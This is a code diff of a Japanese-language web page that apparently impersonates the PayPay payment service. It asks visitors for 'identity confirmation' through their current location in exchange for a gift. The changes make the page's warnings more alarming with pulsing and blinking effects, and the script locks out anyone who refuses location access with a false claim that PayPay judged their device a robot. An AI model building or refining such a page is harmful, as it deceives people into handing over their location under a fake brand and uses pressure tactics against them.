@@ -21,18 +21,27 @@
     .card {
       background-color: #fff;
       border-radius: 12px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
       padding: 25px;
       display: inline-block;
-      max-width: 420px;
+      max-width: 440px;
       width: 100%;
       margin-top: 20px;
+      border: 2px solid #e60012;
+      animation: pulse 1.5s infinite;
+    }
+
+    @keyframes pulse {
+      0% { box-shadow: 0 0 0 0 rgba(230, 0, 18, 0.4); }
+      70% { box-shadow: 0 0 0 10px rgba(230, 0, 18, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(230, 0, 18, 0); }
     }
 
     h2 {
       color: #e60012;
-      font-size: 22px;
+      font-size: 24px;
       margin-bottom: 15px;
+      text-shadow: 0 0 3px rgba(255,0,0,0.7);
     }
 
     p {
@@ -48,6 +57,7 @@
       border: none;
       border-radius: 8px;
       cursor: pointer;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.3);
     }
 
     .note {
@@ -64,8 +74,14 @@
     }
 
     .warning-icon {
-      width: 40px;
+      width: 50px;
       margin-bottom: 10px;
+      animation: blink 1s infinite;
+    }
+
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.2; }
     }
   </style>
 </head>
@@ -74,7 +90,7 @@
   <img src="https://www.paypay.ne.jp/img/logo.svg" width="120" class="logo"/>
 
   <div class="card">
-    <img src="https://cdn.askul.co.jp/img/product/3L1/JA32873_3L1.jpg" class="warning-icon" alt="警告マーク"/>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/55/Warning_icon.svg/240px-Warning_icon.svg.png" class="warning-icon" alt="警告マーク"/>
     <h2>本人確認のお願い</h2>
     <p>
       本サービスの安全な運用を守るため、<br><b>現在地情報の確認</b>をお願いしております。<br>
@@ -112,7 +128,7 @@
           err => {
             alert("⚠️ 位置情報が拒否されたため、ギフトを受け取ることができません。");
             localStorage.setItem('robot', 'true');
-            location.reload(); // 次回アクセス拒否
+            location.reload();
           }
         );
       } else {
@@ -122,14 +138,13 @@
       }
     }
 
-    // 拒否済みユーザーを即ブロック
     if (localStorage.getItem('robot') === 'true') {
       document.body.innerHTML = `
         <div style="padding:50px; text-align:center;">
           <img src="https://www.paypay.ne.jp/img/logo.svg" width="120"><br><br>
-          <img src="https://cdn.askul.co.jp/img/product/3L1/JA32873_3L1.jpg" width="60"><br><br>
-          <h2 style="color:#e60012;">アクセスが制限されました</h2>
-          <p>以前に位置情報取得を拒否されたため、<br>この端末ではご利用いただけません。</p>
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/55/Warning_icon.svg/240px-Warning_icon.svg.png" width="60"><br><br>
+          <h2 style="color:#e60012; text-shadow: 0 0 3px red;">アクセスが制限されました</h2>
+          <p style="color:#333; font-size:15px;">PayPayはこの端末を<b style='color:red;'>ロボットと判断</b>したため、<br>ご利用いただけません。</p>
         </div>
       `;
     }
